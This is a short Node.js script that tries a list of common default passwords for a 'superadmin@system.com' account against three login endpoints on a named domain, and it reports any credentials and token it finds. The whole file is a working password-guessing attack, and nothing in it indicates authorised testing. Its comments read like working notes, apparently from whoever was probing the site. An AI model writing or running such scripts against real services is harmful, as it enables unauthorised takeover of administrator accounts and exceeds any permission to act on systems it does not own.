const axios = require('axios');

const API_URL = 'https://maxp-ai.pro/api/v1/user/login'; // Based on auth routes usually being /user/login or /auth/login
// Let's check routes/userRoutes.js to be sure. But wait, I'll try multiple endpoints.

const ENDPOINTS = [
    'https://maxp-ai.pro/api/v1/auth/login',
    'https://maxp-ai.pro/api/v1/user/login',
    'https://maxp-ai.pro/api/v1/users/login'
];

const PASSWORDS = [
    'password',
    '123456',
    '12345678',
    'admin123',
    'superadmin',
    'password123',
    'admin',
    'system123'
];

async function tryLogin() {
    const email = 'superadmin@system.com';

    for (const endpoint of ENDPOINTS) {
        console.log(`Testing endpoint: ${endpoint}`);
        for (const password of PASSWORDS) {
            try {
                const response = await axios.post(endpoint, {
                    email,
                    password
                });

                if (response.data.success || response.data.token || response.data.accessToken) {
                    console.log(`✅ SUCCESS! Found credentials: ${email} / ${password}`);
                    console.log(`Endpoint: ${endpoint}`);
                    const token = response.data.token || response.data.accessToken || response.data.data.token;
                    console.log(`Token: ${token.substring(0, 20)}...`);
                    return token;
                }
            } catch (error) {
                // console.log(`Failed ${password} on ${endpoint}: ${error.response?.status}`);
            }
        }
    }
    console.log('❌ Failed to crack password.');
    return null;
}

tryLogin();
